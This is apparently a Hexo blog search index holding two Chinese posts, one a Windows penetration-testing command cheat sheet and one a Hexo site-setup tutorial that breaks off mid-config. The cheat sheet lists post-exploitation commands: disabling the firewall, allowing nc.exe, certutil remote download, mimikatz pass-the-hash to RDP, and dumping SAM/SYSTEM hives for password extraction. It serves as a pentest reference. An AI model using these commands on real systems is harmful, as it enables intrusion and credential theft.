<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows常用命令</title>
      <link href="/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="一、用户相关命令"><a href="#一、用户相关命令" class="headerlink" title="一、用户相关命令"></a>一、用户相关命令</h1><h2 id="1-1、查看本机上的用户："><a href="#1-1、查看本机上的用户：" class="headerlink" title="1.1、查看本机上的用户："></a>1.1、查看本机上的用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><h2 id="1-2、指定查看某个用户详情："><a href="#1-2、指定查看某个用户详情：" class="headerlink" title="1.2、指定查看某个用户详情："></a>1.2、指定查看某个用户详情：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &#123;username&#125;</span><br></pre></td></tr></table></figure><h2 id="1-3、添加用户："><a href="#1-3、添加用户：" class="headerlink" title="1.3、添加用户："></a>1.3、添加用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &#123;username&#125; &#123;password&#125; /add</span><br></pre></td></tr></table></figure><h2 id="1-4、修改某个用户密码："><a href="#1-4、修改某个用户密码：" class="headerlink" title="1.4、修改某个用户密码："></a>1.4、修改某个用户密码：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &#123;username&#125; &#123;new_password&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5、删除某个用户："><a href="#1-5、删除某个用户：" class="headerlink" title="1.5、删除某个用户："></a>1.5、删除某个用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &#123;username&#125; /del</span><br></pre></td></tr></table></figure><h2 id="1-6、激活某个用户："><a href="#1-6、激活某个用户：" class="headerlink" title="1.6、激活某个用户："></a>1.6、激活某个用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &#123;username&#125; /active:yes</span><br></pre></td></tr></table></figure><h2 id="1-7、禁用某个用户："><a href="#1-7、禁用某个用户：" class="headerlink" title="1.7、禁用某个用户："></a>1.7、禁用某个用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user &#123;username&#125; /active:no</span><br></pre></td></tr></table></figure><h1 id="二、用户组相关命令"><a href="#二、用户组相关命令" class="headerlink" title="二、用户组相关命令"></a>二、用户组相关命令</h1><h2 id="2-1、列出所有组："><a href="#2-1、列出所有组：" class="headerlink" title="2.1、列出所有组："></a>2.1、列出所有组：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup</span><br></pre></td></tr></table></figure><h2 id="2-2、列出组内成员："><a href="#2-2、列出组内成员：" class="headerlink" title="2.2、列出组内成员："></a>2.2、列出组内成员：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup &#123;groupname&#125;</span><br></pre></td></tr></table></figure><h2 id="2-3、添加用户到组内："><a href="#2-3、添加用户到组内：" class="headerlink" title="2.3、添加用户到组内："></a>2.3、添加用户到组内：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup &#123;username&#125; &#123;groupname&#125; /add</span><br></pre></td></tr></table></figure><h2 id="2-4、删除组内用户："><a href="#2-4、删除组内用户：" class="headerlink" title="2.4、删除组内用户："></a>2.4、删除组内用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup &#123;username&#125; &#123;groupname&#125; /del</span><br></pre></td></tr></table></figure><h1 id="三、网络相关命令"><a href="#三、网络相关命令" class="headerlink" title="三、网络相关命令"></a>三、网络相关命令</h1><h2 id="3-1、查看网络配置："><a href="#3-1、查看网络配置：" class="headerlink" title="3.1、查看网络配置："></a>3.1、查看网络配置：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure><h2 id="3-2、查看配置详细信息："><a href="#3-2、查看配置详细信息：" class="headerlink" title="3.2、查看配置详细信息："></a>3.2、查看配置详细信息：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><h2 id="3-3、查看端口开放状态："><a href="#3-3、查看端口开放状态：" class="headerlink" title="3.3、查看端口开放状态："></a>3.3、查看端口开放状态：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h2 id="3-4、查看ARP表："><a href="#3-4、查看ARP表：" class="headerlink" title="3.4、查看ARP表："></a>3.4、查看ARP表：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><h2 id="3-5、查询路由表："><a href="#3-5、查询路由表：" class="headerlink" title="3.5、查询路由表："></a>3.5、查询路由表：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure><h1 id="四、信息收集及常用命令"><a href="#四、信息收集及常用命令" class="headerlink" title="四、信息收集及常用命令"></a>四、信息收集及常用命令</h1><h2 id="4-1、查看当前用户名："><a href="#4-1、查看当前用户名：" class="headerlink" title="4.1、查看当前用户名："></a>4.1、查看当前用户名：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><h2 id="4-2、查看用户SID："><a href="#4-2、查看用户SID：" class="headerlink" title="4.2、查看用户SID："></a>4.2、查看用户SID：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /all &amp;&amp; whoami /all</span><br></pre></td></tr></table></figure><h2 id="4-3、查看计算机名："><a href="#4-3、查看计算机名：" class="headerlink" title="4.3、查看计算机名："></a>4.3、查看计算机名：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><h2 id="4-4、查看系统信息："><a href="#4-4、查看系统信息：" class="headerlink" title="4.4、查看系统信息："></a>4.4、查看系统信息：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h2 id="4-5、查看系统是否为虚拟机-："><a href="#4-5、查看系统是否为虚拟机-：" class="headerlink" title="4.5、查看系统是否为虚拟机 ："></a>4.5、查看系统是否为虚拟机 ：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">后面含有Virutal就是虚拟机，其他都是物理机</span><br><span class="line">systeminfo | findstr &quot;系统信号&quot;</span><br><span class="line">systeminfo | findstr &quot;System Model&quot;</span><br><span class="line">powershell -exec bypass -command &quot;get-wmiobject win32_computersystem&quot;</span><br></pre></td></tr></table></figure><h2 id="4-6、查询杀软以及查询进程："><a href="#4-6、查询杀软以及查询进程：" class="headerlink" title="4.6、查询杀软以及查询进程："></a>4.6、查询杀软以及查询进程：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br><span class="line">tasklist /v</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><h2 id="4-7、查看系统处理器架构："><a href="#4-7、查看系统处理器架构：" class="headerlink" title="4.7、查看系统处理器架构："></a>4.7、查看系统处理器架构：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h2 id="4-8、查看安装的软件及版本和路径等信息："><a href="#4-8、查看安装的软件及版本和路径等信息：" class="headerlink" title="4.8、查看安装的软件及版本和路径等信息："></a>4.8、查看安装的软件及版本和路径等信息：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br><span class="line">power shell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><h2 id="4-9、查询当前计算机在线用户："><a href="#4-9、查询当前计算机在线用户：" class="headerlink" title="4.9、查询当前计算机在线用户："></a>4.9、查询当前计算机在线用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><h2 id="4-10、查询本机共享："><a href="#4-10、查询本机共享：" class="headerlink" title="4.10、查询本机共享："></a>4.10、查询本机共享：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><h2 id="4-11、查看连接过的所有wifi："><a href="#4-11、查看连接过的所有wifi：" class="headerlink" title="4.11、查看连接过的所有wifi："></a>4.11、查看连接过的所有wifi：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles</span><br></pre></td></tr></table></figure><h2 id="4-12、查看指定WiFi密码："><a href="#4-12、查看指定WiFi密码：" class="headerlink" title="4.12、查看指定WiFi密码："></a>4.12、查看指定WiFi密码：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh wlan show profile name=&quot;WIFI名&quot; key=clear</span><br></pre></td></tr></table></figure><h2 id="4-13、远程下载命令："><a href="#4-13、远程下载命令：" class="headerlink" title="4.13、远程下载命令："></a>4.13、远程下载命令：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f xxx</span><br></pre></td></tr></table></figure><h2 id="4-14、获取当前目录下某个后缀的所有文件绝对路径："><a href="#4-14、获取当前目录下某个后缀的所有文件绝对路径：" class="headerlink" title="4.14、获取当前目录下某个后缀的所有文件绝对路径："></a>4.14、获取当前目录下某个后缀的所有文件绝对路径：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DIR *.properties  /S/B</span><br></pre></td></tr></table></figure><h2 id="4-15、利用certutil对文件进行base64编码："><a href="#4-15、利用certutil对文件进行base64编码：" class="headerlink" title="4.15、利用certutil对文件进行base64编码："></a>4.15、利用certutil对文件进行base64编码：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -encode 1.exe 1.txt</span><br></pre></td></tr></table></figure><h2 id="4-16、利用certutil对文件进行base64解码："><a href="#4-16、利用certutil对文件进行base64解码：" class="headerlink" title="4.16、利用certutil对文件进行base64解码："></a>4.16、利用certutil对文件进行base64解码：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -decode 1.txt 1.jsp</span><br></pre></td></tr></table></figure><h2 id="4-17、获取计算机最近打开的文档："><a href="#4-17、获取计算机最近打开的文档：" class="headerlink" title="4.17、获取计算机最近打开的文档："></a>4.17、获取计算机最近打开的文档：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir %APPDATA%\Microsoft\Windows\Recent</span><br></pre></td></tr></table></figure><h1 id="五、远程桌面操作"><a href="#五、远程桌面操作" class="headerlink" title="五、远程桌面操作"></a>五、远程桌面操作</h1><h2 id="5-1、查询远程桌面连接历史记录："><a href="#5-1、查询远程桌面连接历史记录：" class="headerlink" title="5.1、查询远程桌面连接历史记录："></a>5.1、查询远程桌面连接历史记录：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure><h2 id="5-2、查询远程桌面端口："><a href="#5-2、查询远程桌面端口：" class="headerlink" title="5.2、查询远程桌面端口："></a>5.2、查询远程桌面端口：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</span><br></pre></td></tr></table></figure><h2 id="5-3、查询远程桌面端口开放状态："><a href="#5-3、查询远程桌面端口开放状态：" class="headerlink" title="5.3、查询远程桌面端口开放状态："></a>5.3、查询远程桌面端口开放状态：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano | findstr &quot;3389&quot;</span><br></pre></td></tr></table></figure><h2 id="5-4、开启远程桌面服务："><a href="#5-4、开启远程桌面服务：" class="headerlink" title="5.4、开启远程桌面服务："></a>5.4、开启远程桌面服务：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d 0 /f</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&quot; /v PortNumber /t reg_dword /d 3389 /f</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t reg_dword /d 3389 /f</span><br></pre></td></tr></table></figure><h2 id="5-5、关闭防火墙及开放远程桌面服务端口："><a href="#5-5、关闭防火墙及开放远程桌面服务端口：" class="headerlink" title="5.5、关闭防火墙及开放远程桌面服务端口："></a>5.5、关闭防火墙及开放远程桌面服务端口：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关闭防火墙</span><br><span class="line">net stop mpssvc</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line">允许3389端口放行</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remove Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><h2 id="5-6、Hash-To-RDP："><a href="#5-6、Hash-To-RDP：" class="headerlink" title="5.6、Hash To RDP："></a>5.6、Hash To RDP：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><span class="line">使用mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:USERNAME /domain:IP /ntlm:HASH &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure><h1 id="六、防火墙相关"><a href="#六、防火墙相关" class="headerlink" title="六、防火墙相关"></a>六、防火墙相关</h1><h2 id="6-1、查看当前启用的防火墙配置："><a href="#6-1、查看当前启用的防火墙配置：" class="headerlink" title="6.1、查看当前启用的防火墙配置："></a>6.1、查看当前启用的防火墙配置：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofile state</span><br></pre></td></tr></table></figure><h2 id="6-2、关闭所有防火墙配置："><a href="#6-2、关闭所有防火墙配置：" class="headerlink" title="6.2、关闭所有防火墙配置："></a>6.2、关闭所有防火墙配置：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h2 id="6-3、开启所有防火墙配置："><a href="#6-3、开启所有防火墙配置：" class="headerlink" title="6.3、开启所有防火墙配置："></a>6.3、开启所有防火墙配置：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state on</span><br></pre></td></tr></table></figure><h2 id="6-4、允许指定程序连接："><a href="#6-4、允许指定程序连接：" class="headerlink" title="6.4、允许指定程序连接："></a>6.4、允许指定程序连接：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="6-5、允许指定程序连出："><a href="#6-5、允许指定程序连出：" class="headerlink" title="6.5、允许指定程序连出："></a>6.5、允许指定程序连出：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="6-6、允许3389端口放行："><a href="#6-6、允许3389端口放行：" class="headerlink" title="6.6、允许3389端口放行："></a>6.6、允许3389端口放行：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remove Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><h1 id="七、域内信息收集及常用命令"><a href="#七、域内信息收集及常用命令" class="headerlink" title="七、域内信息收集及常用命令"></a>七、域内信息收集及常用命令</h1><h2 id="7-1、获取当前登陆域："><a href="#7-1、获取当前登陆域：" class="headerlink" title="7.1、获取当前登陆域："></a>7.1、获取当前登陆域：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><h2 id="7-2、查看域-amp-amp-查看是否为多域环境："><a href="#7-2、查看域-amp-amp-查看是否为多域环境：" class="headerlink" title="7.2、查看域&amp;&amp;查看是否为多域环境："></a>7.2、查看域&amp;&amp;查看是否为多域环境：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure><h2 id="7-3、查看域内计算机："><a href="#7-3、查看域内计算机：" class="headerlink" title="7.3、查看域内计算机："></a>7.3、查看域内计算机：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view /domain:domainName</span><br></pre></td></tr></table></figure><h2 id="7-4、查询域内所有域成员计算机列表："><a href="#7-4、查询域内所有域成员计算机列表：" class="headerlink" title="7.4、查询域内所有域成员计算机列表："></a>7.4、查询域内所有域成员计算机列表：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain conputers&quot; /domain</span><br></pre></td></tr></table></figure><h2 id="7-5、查询域管理员用户："><a href="#7-5、查询域管理员用户：" class="headerlink" title="7.5、查询域管理员用户："></a>7.5、查询域管理员用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure><h2 id="7-6、查询域控制器："><a href="#7-6、查询域控制器：" class="headerlink" title="7.6、查询域控制器："></a>7.6、查询域控制器：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure><h2 id="7-7、查询域用户列表："><a href="#7-7、查询域用户列表：" class="headerlink" title="7.7、查询域用户列表："></a>7.7、查询域用户列表：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><h2 id="7-8、查询域控制器及其主机名："><a href="#7-8、查询域控制器及其主机名：" class="headerlink" title="7.8、查询域控制器及其主机名："></a>7.8、查询域控制器及其主机名：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /DCLIST:[domain]</span><br><span class="line">nslookup -type=SRV _ldap._tcp</span><br><span class="line">net time /domain 判断主域</span><br><span class="line">ipconfig /all 通过DNS服务器判断</span><br></pre></td></tr></table></figure><h2 id="7-9、获取域内主机数量："><a href="#7-9、获取域内主机数量：" class="headerlink" title="7.9、获取域内主机数量："></a>7.9、获取域内主机数量：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dsquery computer -limit 1000 &gt;1.txt</span><br></pre></td></tr></table></figure><h2 id="7-10、查看域内计算机："><a href="#7-10、查看域内计算机：" class="headerlink" title="7.10、查看域内计算机："></a>7.10、查看域内计算机：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery computer</span><br></pre></td></tr></table></figure><h2 id="7-11、查看域里的联系人："><a href="#7-11、查看域里的联系人：" class="headerlink" title="7.11、查看域里的联系人："></a>7.11、查看域里的联系人：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery contact</span><br></pre></td></tr></table></figure><h2 id="7-12、查看域里的用户组："><a href="#7-12、查看域里的用户组：" class="headerlink" title="7.12、查看域里的用户组："></a>7.12、查看域里的用户组：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery group</span><br></pre></td></tr></table></figure><h2 id="7-13、查看域用户："><a href="#7-13、查看域用户：" class="headerlink" title="7.13、查看域用户："></a>7.13、查看域用户：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure><h2 id="7-14、查看网段的划分："><a href="#7-14、查看网段的划分：" class="headerlink" title="7.14、查看网段的划分："></a>7.14、查看网段的划分：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery subnet</span><br></pre></td></tr></table></figure><h2 id="7-15、显示所有域控："><a href="#7-15、显示所有域控：" class="headerlink" title="7.15、显示所有域控："></a>7.15、显示所有域控：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery server</span><br></pre></td></tr></table></figure><h2 id="7-16、查看域里的子网："><a href="#7-16、查看域里的子网：" class="headerlink" title="7.16、查看域里的子网："></a>7.16、查看域里的子网：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery subnet</span><br></pre></td></tr></table></figure><h2 id="7-17、获取域控后导出DNS记录："><a href="#7-17、获取域控后导出DNS记录：" class="headerlink" title="7.17、获取域控后导出DNS记录："></a>7.17、获取域控后导出DNS记录：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnscmd /zoneexport domain dns.txt</span><br></pre></td></tr></table></figure><h2 id="7-18、查看域内信任关系："><a href="#7-18、查看域内信任关系：" class="headerlink" title="7.18、查看域内信任关系："></a>7.18、查看域内信任关系：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><h1 id="八、dumphash各类操作"><a href="#八、dumphash各类操作" class="headerlink" title="八、dumphash各类操作"></a>八、dumphash各类操作</h1><h2 id="8-1、通过SAM和SYSTEM文件抓取本机密码："><a href="#8-1、通过SAM和SYSTEM文件抓取本机密码：" class="headerlink" title="8.1、通过SAM和SYSTEM文件抓取本机密码："></a>8.1、通过SAM和SYSTEM文件抓取本机密码：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过注册表获取sam以及system文件</span><br><span class="line">reg save HKLM\SYSTEM Sys.hiv</span><br><span class="line">reg save HKLM\SAM Sam.hiv</span><br><span class="line">拉回本地机子使用mimikatz读取</span><br><span class="line">mimikatz.exe &quot;lsadump::sam /sam:Sam.hiv /system:Sys.hiv&quot; exit&gt; hiv.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建-从0到1</title>
      <link href="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/"/>
      <url>/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<h1 id="零、简述"><a href="#零、简述" class="headerlink" title="零、简述"></a>零、简述</h1><p>Hexo是一个基于 node.js的快速生成静态博客的开源框架,支持 Markdown和大多数 Octopress插件,一个命令即可部署到 Github页面、 Giteee、 Heroku等,强大的APl,可无限扩展,拥有数百个主题和插件。</p><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><h2 id="1-1、安装node-js"><a href="#1-1、安装node-js" class="headerlink" title="1.1、安装node.js"></a>1.1、安装node.js</h2><p>直接到官网上下载安装即可<br><a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></p><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-005512266.png" alt="图 9">  </p><p>Node.js (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</p><p>Node自带npm</p><p>Linux安装node.js：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf node-v16.17.1-linux-x64.tar.xz</span><br><span class="line">sudo <span class="built_in">mkdir</span> /usr/local/node</span><br><span class="line">sudo <span class="built_in">mv</span> node-v16.17.1-linux-x64 /usr/local/node/</span><br><span class="line"></span><br><span class="line">sudo vim /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 末尾添加如下几行</span></span><br><span class="line"><span class="comment"># nodejs</span></span><br><span class="line"><span class="built_in">export</span> NODEJS=/usr/local/node/node-v16.17.1-linux-x64</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$NODEJS</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新加载配置</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装是否成功</span></span><br><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">npx -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看npm配置信息</span></span><br><span class="line">npm config list</span><br></pre></td></tr></table></figure><h2 id="1-2、解决npm国内下载速度过慢的问题"><a href="#1-2、解决npm国内下载速度过慢的问题" class="headerlink" title="1.2、解决npm国内下载速度过慢的问题"></a>1.2、解决npm国内下载速度过慢的问题</h2><ul><li>查看现在用的什么源：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><ul><li>作为临时使用修改npm源（不会影响到本地配置）<br>在<code>npm install XXX 时加入 --registry URL</code>即可，如修改成淘宝npm镜像：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm --registry https://registry.npm.taobao.org install express</span><br></pre></td></tr></table></figure><ul><li>永久修改就需要修改本地npm的配置：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><ul><li>切换之后检查一下现在的源是什么：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><ul><li>如果需要重置为官方源的话：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org/</span><br></pre></td></tr></table></figure><h2 id="1-3、安装Git"><a href="#1-3、安装Git" class="headerlink" title="1.3、安装Git"></a>1.3、安装Git</h2><ul><li>Windows：下载并安装 git.<br>Mac：使用 Homebrew, MacPorts 或者下载 安装程序。</li><li>Linux (Ubuntu, Debian)：sudo apt-get install git-core</li><li>Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core</li></ul><h1 id="二、安装HEXO"><a href="#二、安装HEXO" class="headerlink" title="二、安装HEXO"></a>二、安装HEXO</h1><h2 id="2-1、安装hexo"><a href="#2-1、安装hexo" class="headerlink" title="2.1、安装hexo"></a>2.1、安装hexo</h2><ul><li>使用npm一键安装：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-010348761.png" alt="图 10">  </p><ul><li>查看当前HEXO版本</li></ul><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-010421635.png" alt="图 11">  </p><h2 id="2-2、初始化hexo，新建存储博客的文件夹"><a href="#2-2、初始化hexo，新建存储博客的文件夹" class="headerlink" title="2.2、初始化hexo，新建存储博客的文件夹"></a>2.2、初始化hexo，新建存储博客的文件夹</h2><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-010455350.png" alt="图 12">  </p><p>各文件夹含义：</p><ul><li>scaffolds: 模板文件夹(存放文章)</li><li>source：存放用户资源文件夹</li><li>themes：主题文件夹</li><li>_config.yml：网站配置信息</li><li>package.json：应用程序信息</li></ul><h2 id="2-3、启动HEXO站点"><a href="#2-3、启动HEXO站点" class="headerlink" title="2.3、启动HEXO站点"></a>2.3、启动HEXO站点</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#自动根据当前目录下文件,生成静态网页</span></span><br><span class="line">hexo generate</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后执行命令运行本地服务： </span></span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-010738250.png" alt="图 13">  </p><p>访问本地4000端口<br><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-010804947.png" alt="图 14">  </p><h1 id="三、GitHub上建站访问"><a href="#三、GitHub上建站访问" class="headerlink" title="三、GitHub上建站访问"></a>三、GitHub上建站访问</h1><h2 id="3-1、创建GitHub仓库"><a href="#3-1、创建GitHub仓库" class="headerlink" title="3.1、创建GitHub仓库"></a>3.1、创建GitHub仓库</h2><p>在github上创建一个仓库并命名为：<code>username+github.io</code><br><img src="/Hexo%E6%90%AD%E5%BB%BA-%E4%BB%8E0%E5%88%B01/IMG_20221005-010901193.png" alt="图 15">  </p><h2 id="3-2、安装hexo上传插件"><a href="#3-2、安装hexo上传插件" class="headerlink" title="3.2、安装hexo上传插件"></a>3.2、安装hexo上传插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h2 id="3-3、修改hexo配置文件指定仓库路径"><a href="#3-3、修改hexo配置文件指定仓库路径" class="headerlink" title="3.3、修改hexo配置文件指定仓库路径"></a>3.3、修改hexo配置文件指定仓库路径</h2><p>修改_config.yml配置文件</p><p>找到Deployment,修改deploy参数为以下内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy: </span><br><span class="line">    <span class="built_in">type</span>: git</span><br><span class="line">    repo: 你的github仓库路径</span><br><span class="line">    branch: 